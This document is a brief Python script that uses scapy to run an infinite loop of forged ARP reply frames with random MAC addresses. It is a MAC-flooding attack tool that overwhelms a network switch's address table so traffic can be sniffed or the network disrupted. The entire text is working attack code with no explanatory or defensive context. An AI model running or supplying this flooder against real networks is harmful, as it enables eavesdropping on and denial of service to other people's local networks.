from scapy.all import *
while 1:
  dest_mac = RandMAC()
  src_mac = RandMAC()
  sendp(Ether(src=src_mac, dst=dest_mac)/ARP(op=2, psrc="0.0.0.0", hwsrc=src_mac, hwdst=dest_mac)/Padding(load="X"*18), verbose=0)
